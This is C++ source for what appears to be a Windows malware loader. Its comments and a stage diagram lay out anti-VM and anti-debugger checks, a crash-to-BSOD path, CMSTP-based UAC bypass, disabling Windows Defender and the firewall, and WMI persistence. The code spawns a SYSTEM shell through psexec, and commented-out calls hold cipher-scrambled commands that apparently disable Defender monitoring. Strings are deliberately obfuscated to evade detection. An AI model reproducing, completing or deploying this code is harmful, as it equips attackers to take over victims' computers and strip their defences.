// Loader 

// Contains the main logic for the installer

/*
 With very few exceptions, every string in the loader is
 encrypted with a modified railfence cipher. This has three 
 advantages:

 1. The modifications make it mildly annoying to reverse
 
 2. The modifications make it easy to modify the cipher and
    subsequently change the signature of every string
 
 3. The strings have low entropy, so we can store an arbitrary
    number of them without packer detection being triggered
*/

/*
┌──────────────────┐      ┌───────────────────────┐      ┌──────────┐
│  Initial State   ├─────►│  Detect VM/Debugger   ├─────►│   BSOD   │
└──────────────────┘      └───────────┬───────────┘      └──────────┘
                                      │
                                      │
                                      ▼
                          ┌───────────────────────┐
                          │Detect Multi Instances ├───────────┐
                          └───────────┬───────────┘           │
                                      │                       │
                                      │                       │
                                      ▼                       │
                          ┌───────────────────────┐           │
                          │    Auto Escalation    ├─────┐     │
                          └───────────┬───────────┘     │     │
┌──────────────────┐                  │                 │     │
│ Failsafe Install │                  │                 │     │
└──────────────────┘                  │                 │     │
         ▲                            ▼                 │     │
         │                 ┌──────────────────────┐     │     │
         └─────────────────┤  Manual Escalation   │     │     │
                           └──────────┬───────────┘     │     │
                                      │                 │     │
                                      │                 │     │
                                      │                 │     │
                                      ▼                 │     │
                           ┌──────────────────────┐     │     │
                           │  Disable Antivirus   │◄────┘     │
                           └──────────┬───────────┘           │
                                      │                       │
 ┌─────────────────┐                  │                       │
 │    Terminate    │ ◄────────────────┼───────────────────────┘
 └─────────────────┘                  │
       ▲     ▲                        ▼
       │     │             ┌──────────────────────┐
       │     └─────────────┤  Create FTC Binders  │
       │                   └──────────┬───────────┘
       │                              │
       │                              │
       │                              ▼
       │                   ┌──────────────────────┐
       └───────────────────┤  Write WMI Payloads  │
                           └──────────────────────┘
 */
   
#pragma once
#include "loader.h"
#include "ExportInterface.hpp"
#include "AutoElevation.hpp"

LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, L"Global\\{MAOZDONG-SAYS-KILL-EVRY-LANDLORDDDDD}");
    if(hEvent != 0)
        ResetEvent(hEvent);
    return EXCEPTION_CONTINUE_SEARCH;
}

   
int main()
{
    // -----------------------------------------------------
    // -- Setup --------------------------------------------
    
    // Wrapper class definitions
    COMWrapper COM;
    NtWrapper ntdll;
    KernelbaseWrapper IKB;
    Win32Wrapper IWin32;
    ShellWrapper IShell;
    SetupAPIWrapper ISetupAPI;
    ExceptionWrapper IException;
    Railfence ciph;
    
    // Dependency injected class definitions
    WMIConnection WMI(COM);
    UACInterface IUAC(COM, IWin32, IKB);
    AntiAnalysis mxAntiAnalysis(ISetupAPI, ntdll);
    AutoElevation AutoElevate(COM, ciph, IUAC);
    
    // Anti-Analysis checks
    // Pretty much only effective against automated analysis
    mxAntiAnalysis.Execute();

    //WMIDiagnostic(COM, WMI);

	// Create a global event, we'll use it as a mutex to prevent multiple instances of the loader
	// from running at the same time. Far less heuristically suspicious than using pipes.
    // Also has the lowest score of all possible communication options on a MITRE attack matrix.
    HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, L"Global\\{MAOZDONG-SAYS-KILL-EVRY-LANDLORDDDDD}");
    
    if(!hEvent)
		return 0;
    
	// Check if the global event already exists
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		// If it does, check if the event is set
        if(hEvent != 0) // Corrupted stack check
		    if (WaitForSingleObject(hEvent, 0) == WAIT_OBJECT_0)
		    {
                // If it's set, we need to exit
			    ILog("Still running\n");
			    return 0;
		    }
            else
            {
                ILog("Not running\n");
            }
	}
    
    // Prevent event from remaining set if the process crashes
    if (IException.IReady)
        IException.SetUnhandledExceptionFilter(ExceptionHandler);
    
    // Set the event mutex
	SetEvent(hEvent);

	// Get our current elevation level
    ULONG ElevationLevel = IUAC.CheckElevation();
    
    // This event will be set if we're escalated
    // This is how we know whether to exit our unprivileged instance
    // or revert to a failsfe install
    const HANDLE hEscalated = CreateEvent(0, FALSE, FALSE, L"{REDISTRIBUTED-ADMIN-PRIVS-COMRADE}");
    

    // -----------------------------------------------------
    // -- Execution ----------------------------------------
    
    switch (ElevationLevel)
    {
        case 0x1:
            // Elevated: UAC is disabled or user is the built-in admin
			// - 1. Disable Windows Defender (if enabled)
            // - 2. Disable Windows Firewall
            // - 3. Install
            ILog("We are elevated\n");
            SetEvent(hEscalated);
            system("PAUSE");
            break;
            
        case 0x2:
			// Elevated: UAC is enabled and user is in the admin group
			// - 1. Disable UAC
			// - 2. Disable Windows Defender (if enabled)
			// - 3. Disable Windows Firewall
			// - 4. Install
            ILog("We are elevated\n");
            system("psexec -i -s cmd.exe");
            SetEvent(hEscalated);
            system("PAUSE");
            break;
            
        case 0x3:
			// Not Elevated: UAC is enabled and user is in the admin group
			// - 1. Perform CMSTP autoelevation
			// - 2. If unsuccessful, perform user-mode installation
            //      Otherwise we're at level 2
			ILog("We are not elevated\n");
			system("PAUSE");
            ResetEvent(hEvent);
			if (AutoElevate.IReady)
                if (!AutoElevate.AutoElevate())
                {
                    // Escalation failed
                    ILog("Escalation failed\n");
                    
                }
                else
                {
					// Escalation succeeded
                    ILog("Escalation successful\n");
                }
            break;
            
        case 0x4:
			// Not Elevated: UAC is enabled and user is not in the admin group
            // - 1. Perform user-mode installation
            break;
            
        default:
            // Unknown error
            break;
    }
    
    // Execute some shell commands
    // Just test code
    if (IShell.IReady)
    {
        //IShell.Execute("bec.xdteeid", "open", "-ncnsityhoeoete tngics rk");
        //IShell.Execute("ploelwh.eseerx", "open", "Se eeieerfe-lRmMrnutPecDbeioogr-prniaatnt tMesli$");
    }
    
    // Cleanup
    ResetEvent(hEvent);
    ResetEvent(hEscalated);
    return 0;
}